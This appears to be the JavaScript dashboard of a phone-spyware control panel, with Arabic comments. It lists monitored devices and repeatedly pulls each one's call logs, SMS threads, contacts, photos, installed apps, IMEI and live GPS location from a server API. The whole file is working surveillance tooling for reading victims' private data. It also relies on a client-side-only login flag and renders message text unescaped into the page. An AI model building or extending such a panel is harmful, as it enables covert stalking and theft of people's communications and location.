// التحقق من تسجيل الدخول
if (sessionStorage.getItem('logged_in') !== 'true') {
    window.location.href = 'login.html';
}

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;
let allCalls = [];
let allSMS = [];
let allContacts = [];
let currentChat = null;
let currentCallNumber = null;
let currentContact = null;

function logout() {
    sessionStorage.removeItem('logged_in');
    window.location.href = 'login.html';
}

// حذف الجهاز
async function deleteDevice() {
    if (!currentDevice) return;
    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
    
    try {
        await fetch(`/api.php?action=delete_device&device=${currentDevice}`, { method: 'GET' });
        alert('تم حذف الجهاز');
        loadDevices();
        currentDevice = null;
        document.getElementById('deviceSelect').value = '';
    } catch (e) {
        alert('خطأ في الحذف');
    }
}

// تحميل الأجهزة
async function loadDevices() {
    try {
        const response = await fetch('/devices.json');
        const devices = await response.json();
        
        const select = document.getElementById('deviceSelect');
        const currentValue = currentDevice;
        select.innerHTML = '<option value="">اختر الجهاز...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.id;
            select.appendChild(option);
        });
        
        if (currentValue) {
            select.value = currentValue;
        }
    } catch (e) {
        console.error('Devices error:', e);
    }
}

function selectDevice(deviceId) {
    currentDevice = deviceId;
    
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    
    if (deviceId) {
        // تحديث الحالة كل 3 ثوانٍ
        updateInterval = setInterval(updateLiveData, 3000);
        
        // تحديث البيانات الكاملة كل 5 ثوانٍ
        dataInterval = setInterval(() => {
            if (currentDevice) {
                loadAllData();
            }
        }, 5000);
        
        updateLiveData();
        loadAllData();
    }
}

async function updateLiveData() {
    if (!currentDevice) return;
    
    try {
        const response = await fetch(`/live.php?device=${currentDevice}`);
        const data = await response.json();
        
        const statusEl = document.getElementById('networkStatus');
        if (data.online) {
            statusEl.textContent = data.network || 'متصل';
            statusEl.className = 'value online';
        } else {
            statusEl.textContent = 'غير متصل';
            statusEl.className = 'value offline';
        }
        
        if (data.location && data.location.latitude) {
            document.getElementById('locationStatus').textContent = 
                `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}`;
            document.getElementById('locationStatus').className = 'value online';
            showLocationDetails(data.location);
        }
        
        if (data.battery !== null && data.battery !== undefined) {
            document.getElementById('batteryStatus').textContent = data.battery + '%';
        }
        
        if (data.seconds_ago !== undefined) {
            const lastSeen = document.getElementById('lastSeen');
            if (data.seconds_ago < 10) lastSeen.textContent = 'الآن';
            else if (data.seconds_ago < 60) lastSeen.textContent = `${data.seconds_ago} ثانية`;
            else lastSeen.textContent = `${Math.floor(data.seconds_ago / 60)} دقيقة`;
        }
        
        if (data.call_count !== undefined) 
            document.getElementById('callCount').textContent = `(${data.call_count})`;
        if (data.sms_count !== undefined) 
            document.getElementById('smsCount').textContent = `(${data.sms_count})`;
        if (data.contacts_count !== undefined) 
            document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
        if (data.images_count !== undefined) 
            document.getElementById('imagesCount').textContent = `(${data.images_count})`;
        if (data.apps_count !== undefined) 
            document.getElementById('appsCount').textContent = `(${data.apps_count})`;
        
    } catch (e) {
        console.error('Live error:', e);
    }
}

async function loadAllData() {
    if (!currentDevice) return;
    await loadCalls();
    await loadSMS();
    await loadContacts();
    await loadImages();
    await loadApps();
    await loadDeviceInfo();
}

// ============ المكالمات ============
async function loadCalls() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=call_logs`);
        const newCalls = await response.json();
        
        if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
            allCalls = newCalls;
            if (currentCallNumber) {
                openCallDetail(currentCallNumber);
            } else {
                displayCallsList();
            }
        }
    } catch (e) {}
}

function displayCallsList() {
    const listDiv = document.getElementById('callsListView');
    const detailDiv = document.getElementById('callDetailView');
    detailDiv.style.display = 'none';
    listDiv.style.display = 'block';
    
    listDiv.innerHTML = '';
    
    if (!allCalls || allCalls.length === 0) {
        listDiv.innerHTML = '<p style="color:#888;">لا توجد مكالمات</p>';
        return;
    }
    
    // تجميع حسب الرقم
    const callGroups = {};
    allCalls.forEach(call => {
        const number = call.number || 'غير معروف';
        if (!callGroups[number]) {
            callGroups[number] = [];
        }
        callGroups[number].push(call);
    });
    
    Object.keys(callGroups).forEach(number => {
        const calls = callGroups[number];
        const lastCall = calls[0]; // الأحدث لأن الترتيب DESC
        
        const div = document.createElement('div');
        div.className = 'conversation-item';
        div.onclick = () => openCallDetail(number);
        div.innerHTML = `
            <div class="conversation-avatar">📞</div>
            <div class="conversation-info">
                <div class="conversation-name">${number}</div>
                <div class="conversation-preview">
                    ${getCallType(lastCall.type)} • ${formatDuration(lastCall.duration)} • ${formatDate(lastCall.date)}
                </div>
            </div>
            <div class="conversation-count">${calls.length} مكالمة</div>
        `;
        listDiv.appendChild(div);
    });
}

function openCallDetail(number) {
    currentCallNumber = number;
    document.getElementById('callsListView').style.display = 'none';
    document.getElementById('callDetailView').style.display = 'block';
    document.getElementById('callDetailTitle').textContent = `📞 ${number}`;
    
    const detailsDiv = document.getElementById('callDetailsList');
    detailsDiv.innerHTML = '';
    
    const calls = allCalls.filter(call => call.number === number);
    
    calls.forEach(call => {
        const div = document.createElement('div');
        div.className = 'call-detail-item';
        div.innerHTML = `
            <span class="call-type type-${call.type}">${getCallType(call.type)}</span>
            <span>⏱️ ${formatDuration(call.duration)}</span>
            <span>📅 ${formatDate(call.date)}</span>
        `;
        detailsDiv.appendChild(div);
    });
}

function backToCallsList() {
    currentCallNumber = null;
    displayCallsList();
}

// ============ الرسائل ============
async function loadSMS() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=sms`);
        const newSMS = await response.json();
        
        if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
            allSMS = newSMS;
            if (currentChat) {
                openChat(currentChat);
            } else {
                displayConversations();
            }
        }
    } catch (e) {}
}

function displayConversations() {
    const conversationsDiv = document.getElementById('conversationsList');
    const chatView = document.getElementById('chatView');
    chatView.style.display = 'none';
    conversationsDiv.style.display = 'block';
    
    conversationsDiv.innerHTML = '';
    
    if (!allSMS || allSMS.length === 0) {
        conversationsDiv.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>';
        return;
    }
    
    // تجميع حسب الرقم
    const conversations = {};
    allSMS.forEach(sms => {
        const number = sms.address || 'غير معروف';
        if (!conversations[number]) conversations[number] = [];
        conversations[number].push(sms);
    });
    
    Object.keys(conversations).forEach(number => {
        const messages = conversations[number];
        const lastMessage = messages[0]; // الأحدث لأن الترتيب DESC
        
        const div = document.createElement('div');
        div.className = 'conversation-item';
        div.onclick = () => openChat(number);
        div.innerHTML = `
            <div class="conversation-avatar">💬</div>
            <div class="conversation-info">
                <div class="conversation-name">${number}</div>
                <div class="conversation-preview">${lastMessage.body || ''}</div>
            </div>
            <div class="conversation-time">${formatDate(lastMessage.date)}</div>
        `;
        conversationsDiv.appendChild(div);
    });
}

function openChat(number) {
    currentChat = number;
    document.getElementById('conversationsList').style.display = 'none';
    document.getElementById('chatView').style.display = 'block';
    document.getElementById('chatTitle').textContent = `💬 ${number}`;
    
    const messagesList = document.getElementById('messagesList');
    messagesList.innerHTML = '';
    
    const chatMessages = allSMS.filter(sms => sms.address === number);
    
    // ترتيب من الأقدم للأحدث داخل المحادثة
    chatMessages.reverse();
    
    chatMessages.forEach(sms => {
        const div = document.createElement('div');
        div.className = `message ${sms.type == 1 ? 'incoming' : 'outgoing'}`;
        div.innerHTML = `
            <div class="message-bubble">
                <div class="message-text">${sms.body || ''}</div>
                <div class="message-time">${formatDate(sms.date)}</div>
            </div>
        `;
        messagesList.appendChild(div);
    });
    
    messagesList.scrollTop = messagesList.scrollHeight;
}

function backToConversations() {
    currentChat = null;
    displayConversations();
}

// ============ جهات الاتصال ============
async function loadContacts() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=contacts`);
        const newContacts = await response.json();
        
        if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
            allContacts = newContacts;
            if (currentContact) {
                openContactDetail(currentContact);
            } else {
                displayContactsList();
            }
        }
    } catch (e) {}
}

function displayContactsList() {
    const listDiv = document.getElementById('contactsListView');
    const detailDiv = document.getElementById('contactDetailView');
    detailDiv.style.display = 'none';
    listDiv.style.display = 'block';
    
    listDiv.innerHTML = '';
    
    if (!allContacts || allContacts.length === 0) {
        listDiv.innerHTML = '<p style="color:#888;">لا توجد جهات اتصال</p>';
        return;
    }
    
    allContacts.forEach(contact => {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        
        const div = document.createElement('div');
        div.className = 'conversation-item';
        div.onclick = () => openContactDetail(contact.name);
        div.innerHTML = `
            <div class="conversation-avatar">👤</div>
            <div class="conversation-info">
                <div class="conversation-name">${contact.name || 'بدون اسم'}</div>
                <div class="conversation-preview">${numbers.join(', ')}</div>
            </div>
            <button class="action-btn" onclick="event.stopPropagation(); openChat('${numbers[0]}')">💬</button>
        `;
        listDiv.appendChild(div);
    });
}

function openContactDetail(name) {
    currentContact = name;
    document.getElementById('contactsListView').style.display = 'none';
    document.getElementById('contactDetailView').style.display = 'block';
    
    const contact = allContacts.find(c => c.name === name);
    const detailsDiv = document.getElementById('contactDetails');
    
    if (!contact) return;
    
    const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
    
    detailsDiv.innerHTML = `
        <div class="contact-detail-card">
            <div class="contact-avatar">👤</div>
            <h4>${contact.name || 'بدون اسم'}</h4>
            <div class="contact-numbers">
                ${numbers.map(n => `
                    <div class="contact-number-item">
                        <span>${n}</span>
                        <div>
                            <button class="action-btn" onclick="openChat('${n}')">💬</button>
                            <button class="action-btn" onclick="openCallDetail('${n}')">📞</button>
                        </div>
                    </div>
                `).join('')}
            </div>
        </div>
    `;
}

function backToContactsList() {
    currentContact = null;
    displayContactsList();
}

// ============ الصور ============
async function loadImages() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=images`);
        const images = await response.json();
        
        const grid = document.getElementById('imagesGrid');
        grid.innerHTML = '';
        
        if (!images || images.length === 0) {
            grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>';
            return;
        }
        
        images.forEach((image, index) => {
            const div = document.createElement('div');
            div.className = 'image-item';
            
            const img = document.createElement('img');
            
            // عرض الصورة من Base64
            if (image.data) {
                // تحديد نوع الصورة
                let mimeType = 'image/jpeg';
                if (image.name) {
                    const ext = image.name.toLowerCase().split('.').pop();
                    if (ext === 'png') mimeType = 'image/png';
                    else if (ext === 'gif') mimeType = 'image/gif';
                    else if (ext === 'webp') mimeType = 'image/webp';
                }
                img.src = `data:${mimeType};base64,${image.data}`;
            } else {
                // صورة بديلة
                img.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="150" height="150"><rect width="150" height="150" fill="#1a1a4e"/><text x="75" y="75" text-anchor="middle" fill="#888" font-size="30">📷</text></svg>');
            }
            
            img.className = 'thumb';
            img.alt = image.name || `صورة ${index + 1}`;
            img.onclick = () => window.open(img.src, '_blank');
            
            const name = document.createElement('div');
            name.className = 'image-name';
            name.textContent = image.name || `صورة ${index + 1}`;
            
            div.appendChild(img);
            div.appendChild(name);
            grid.appendChild(div);
        });
    } catch (e) {
        console.error('Images error:', e);
    }
}

// ============ التطبيقات ============
async function loadApps() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=installed_apps`);
        const apps = await response.json();
        
        const tbody = document.querySelector('#appsTable tbody');
        tbody.innerHTML = '';
        
        if (!apps || apps.length === 0) {
            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#888;">لا توجد تطبيقات</td></tr>';
            return;
        }
        
        apps.forEach(app => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${app.name || app.package || ''}</td>
                <td>${app.package || ''}</td>
                <td>${app.system_app ? 'نعم' : 'لا'}</td>
            `;
            tbody.appendChild(row);
        });
    } catch (e) {}
}

// ============ معلومات الجهاز ============
async function loadDeviceInfo() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=device_info`);
        const info = await response.json();
        
        const div = document.getElementById('deviceInfo');
        
        if (!info || Object.keys(info).length === 0) {
            div.innerHTML = '<p style="color:#888;">لا توجد معلومات</p>';
            return;
        }
        
        div.innerHTML = `
            <div class="device-info-grid">
                <div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div>
                <div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div>
                <div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div>
                <div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div>
                <div class="info-card"><span>الناقل:</span><strong>${info.carrier || '—'}</strong></div>
                <div class="info-card"><span>الذاكرة:</span><strong>${formatBytes(info.total_ram)}</strong></div>
                <div class="info-card"><span>المساحة الحرة:</span><strong>${formatBytes(info.free_storage)}</strong></div>
            </div>
        `;
    } catch (e) {}
}

// ============ الموقع ============
function showLocationDetails(location) {
    const div = document.getElementById('locationDetails');
    if (location && location.latitude) {
        div.innerHTML = `
            <p>📍 خط العرض: ${location.latitude.toFixed(6)}</p>
            <p>📍 خط الطول: ${location.longitude.toFixed(6)}</p>
            <p>📏 الدقة: ${location.accuracy ? location.accuracy + ' متر' : '—'}</p>
        `;
    }
}

// ============ دوال مساعدة ============
function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    
    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
    if (tab) tab.classList.add('active');
    
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
}

function formatDuration(seconds) {
    if (!seconds || seconds < 0) return '0:00';
    return `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`;
}

function formatDate(timestamp) {
    if (!timestamp) return '—';
    try { return new Date(timestamp).toLocaleString('ar'); } catch (e) { return '—'; }
}

function formatBytes(bytes) {
    if (!bytes || bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function getCallType(type) {
    switch(parseInt(type)) {
        case 1: return '📥 وارد';
        case 2: return '📤 صادر';
        case 3: return '❌ فائت';
        default: return 'غير معروف';
    }
}

// تحميل الأجهزة عند الفتح
loadDevices();
setInterval(loadDevices, 10000);
